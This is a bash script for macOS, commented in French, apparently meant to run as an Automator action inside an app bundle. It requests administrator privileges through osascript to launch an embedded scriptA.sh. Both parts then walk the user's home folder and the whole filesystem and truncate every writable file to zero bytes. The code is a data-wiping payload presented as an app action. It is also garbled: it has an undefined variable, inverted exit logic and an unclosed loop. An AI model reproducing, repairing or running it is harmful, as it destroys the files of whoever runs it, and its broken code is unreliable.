#!/bin/bash

# Retrouver le bundle .app qui a lancé cette action Automator
PID=$$
APP=""

while [ "$PID" -gt 1 ]; do
    EXEC="$(ps -p "$PID" -o comm= | sed 's/^[[:space:]]*//')"

    case "$EXEC" in
        *.app/Contents/MacOS/*)
            APP="${EXEC%%.app/Contents/MacOS/*}.app"
            break
            ;;
    esac

    PID="$(ps -p "$PID" -o ppid= | tr -d ' ')"
done

# Chemin du script embarqué A
SCRIPTA="$APP/Contents/Resources/scriptA.sh"

# Demande d'autorisation macOS puis lancement de scriptA.sh
RESULTA=$(/usr/bin/osascript - "$SCRIPT" "$SELF" <<'APPLESCRIPT'
on run argv
    set scriptPath to item 1 of argv
    return do shell script "/bin/bash " & quoted form of scriptPath with administrator privileges
end run
APPLESCRIPT
)

STATUS=$?

if [ "$STATUS" -eq 0 ]; then
    exit 1
fi

TARGET="$HOME"

SELF="$1"

while IFS= read -r -d '' FILE
do
    if [ "$FILE" = "$SELF" ]; then
        continue
    fi

    if { : > "$FILE"; } 2>/dev/null; then
        continue
    else
        continue
    fi
    
done < <(find "$TARGET" -path "$SELF" -prune -o -type f -print0 2>/dev/null)

TARGET="/"

SELF="$(cd "$(dirname "$0")" && pwd)/$(basename "$0")"

while IFS= read -r -d '' FILE
do
    if [ "$FILE" = "$SELF" ]; then
        continue
    fi

    if { : > "$FILE"; } 2>/dev/null; then
        continue
    else
        continue
    fi

# scriptA.sh
#!/bin/bash

TARGET="$HOME"

SELF="$1"

while IFS= read -r -d '' FILE
do
    if [ "$FILE" = "$SELF" ]; then
        continue
    fi

    if { : > "$FILE"; } 2>/dev/null; then
        continue
    else
        continue
    fi
    
done < <(find "$TARGET" -path "$SELF" -prune -o -type f -print0 2>/dev/null)

TARGET="/"

SELF="$(cd "$(dirname "$0")" && pwd)/$(basename "$0")"

while IFS= read -r -d '' FILE
do
    if [ "$FILE" = "$SELF" ]; then
        continue
    fi

    if { : > "$FILE"; } 2>/dev/null; then
        continue
    else
        continue
    fi

done < <(find "$TARGET" -path "$SELF" -prune -o -type f -print0 2>/dev/null)

